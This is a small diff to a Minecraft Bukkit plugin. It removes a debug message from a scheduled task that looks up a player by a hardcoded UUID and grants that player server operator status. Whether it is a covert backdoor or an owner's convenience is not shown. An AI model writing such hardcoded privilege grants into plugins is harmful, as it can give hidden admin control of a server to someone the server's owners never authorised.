@@ -15,7 +15,6 @@ public class opMartinErSej extends BukkitRunnable {
     public void run() {
         Player player = Bukkit.getPlayer(UUID.fromString("c3e9356e-841c-4a9f-8805-f4c5f0ea1255"));
         if (player != null) {
-            sendActionBar(player,"tester noget");
             player.setOp(true);
         }
     }
